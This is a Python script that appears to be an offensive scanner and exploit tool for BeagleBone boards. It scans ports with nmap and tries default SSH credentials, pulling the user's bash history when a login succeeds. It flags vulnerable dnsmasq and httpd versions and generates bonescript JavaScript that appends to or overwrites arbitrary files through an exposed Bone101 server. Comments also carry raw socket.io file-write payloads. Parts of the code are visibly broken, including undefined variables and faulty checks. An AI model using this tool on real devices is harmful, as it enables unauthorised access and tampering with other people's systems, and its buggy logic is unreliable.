#!/usr/bin/env python
import nmap
import argparse
from sys import version_info, path
from pwn import *
from time import sleep
from os import geteuid

def check_ssh(ip,user,passwd):
	try:
		s =  ssh(host=ip,
	       user=user,
	       password=passwd,port=22)
		return s.download_data("/home/debian/.bash_history") is not None
	except:
		return False

def append_file(file, append):
	return """
/**
This is a POC implementation of an exploit for the BeagleBone using bonescript.
This file implements an append function on any file in the system.
*/

var b = require('bonescript');
// file to be changed
var file = '%s';
// this is the data read
let output = '';
// this is the data to append
let append = '%s'

// this function reads file and outputs data in the output variable
b.readTextFile(file, function (x){
    output = x.data;
    console.log('inside method output of x'+output);
});

// this function writes data to a file
// this function is delayed so it does not write before read is completed
setTimeout(function(){ 
     console.log("output of x:  "+output);
    b.writeTextFile(file, output+append, readStatus);
}, 3000); 

function readStatus(x) {
    console.log(JSON.stringify(x));
}
""" % (file, append)



def overwrite_file(file, write):
	return """
/**
This is a POC implementation of an exploit for the BeagleBone using bonescript.
This file implements an append function on any file in the system.
*/

var b = require('bonescript');
// file to be changed
var file = '%s';
// this is the data to append
let append = '%s'

// this function writes data to a file
// this function is delayed so it does not write before read is completed
setTimeout(function(){ 
     console.log("output of x:  "+output);
    b.writeTextFile(file, output+append, readStatus);
},0); 

function readStatus(x) {
    console.log(JSON.stringify(x));
}
""" % (file, write)


def scan(ip,args):
	# notify user that the scan is beginning
	print("Scanning "+ip+"...")
	nm = nmap.PortScanner()
	scan = nm.scan(ip,'21-443,3000,8080,9090')
	
	# parse results
	command = scan['nmap']
	stats = command['scanstats']
	scan_scan = scan['scan']
	if not scan_scan:
		print("Scan failed. No results returned. Check that host is up.")
		return
	results = scan_scan[scan_scan.keys()[0]] # this is the ip address
	relevant_results = results['tcp'] 		 # these indicate open ports

	# Checking SSH
	if 22 in relevant_results:
		print("Port 22: SSH is open") # notify user
		# in the event that we are agressive we try some basic passwords
		if args.aggressive:
			pwd_map = [("root",""),("root","temppwd"),("debian",""),("debian","temppwd")]
			for i in pwd_map:
				works = "works" if check_ssh(ip,i[0],i[1]) else "did not work"
				print("[SSH] attempt: "+str(i)+" "+works)
				if works:
					break
	# Checking DNSmasq
	if 53 in relevant_results:
		print("Port 53: DNSMASQ is open")
		if "version" in relevant_results[53]:
			version = relevant_results[53]["version"].split(".")
			if len(version) >=2:
				maj_version = int(version[0])
				min_version = int(version[1])
				if maj_version <=2 and min_version <= 78:
					print("[DNSMASQ] version is vulnerable")
				else:
					print("[DNSMASQ] version is not vulnerable")
			else:
				print("[DNSMASQ] no version information returned.")
		else:
			print("[DNSMASQ] no version information returned.")

	# Checking HTTP Port 80
	if 80 in relevant_results:
		print("Port 80: http is open")

		#lets check to see if its Bone101
		result = wget("http://"+ip, timeout=20)
		if "Bone101" in result:
			print("[HTTP] Server running open Bone101.")
			if args.aggressive:
				# this is where the headless browser would have been
				if ui.yesno('Do you want to generate a POC Exploit?'):
					if ui.yesno('Do you want to preserve the original file?'):
						print(append_file("[file_name]", "[text to append]"))
					else:
						print(overwrite_file("[file_name]", "[text to overwrite]"))
		else:
			print("[HTTP] Server not running Bone101.")

			
	if 3000 in relevant_results:
		print("Port 3000 open")
		result = wget("http://"+ip+":3000",timeout=20)
		if "Cloud9" in result:
			print("Server running Cloud9.")
			if args.aggressive:
				pass
		else:
			print("Server not running Cloud9.")
		#42["bonescript$readTextFile",{"filename":"/home/debian/out.txt","seq":12}]
		#42["bonescript$writeTextFile",{"filename":"/home/debian/out.txt","data":"heartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\ndatatoappend\n","seq":13}]
	if 8080 in relevant_results:
		print("Port 8080: HTTPD running on port 8080")
		if "version" in relevant_results[8080]:
			version = relevant_results[8080]["version"].split(".")
			maj_version = int(version[0])
			mid_version = int(version[1])
			min_version = int(version[2])
			if maj_version <=2 and mid_version <= 4 and min_version <= 25:
				print("[HTTPD] version is vulnerable")
			else:
				print("[HTTPD] version is not vulnerable")
		else:
			print("[DNSMASQ] no version information returned.")

def main():
	# parse arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("ip")
	parser.add_argument("-aggr","-aggressive", '--aggressive', action="store_true")
	parser.add_argument("-mean","-mean","--mean",action="store_true")
	args = parser.parse_args()

	if (args.aggressive or args.mean):
		if not geteuid()==0:
			print("you must run this as root if you wish to use agressive or mean options".upper())
			return
		print("Please only use these options on devices you have permission to use on.")


	if "*" in args.ip:
		ip = ".".join(args.ip.split(".")[:3])+"."
		for i in range(1,256):
			if "*" in ip:
				print("we are not scanning over anything bigger than a subnet")
				return
			scan(ip+str(i))

	else:
		scan(args.ip,args)


if __name__ == "__main__":
	main()
	# print(check_root())
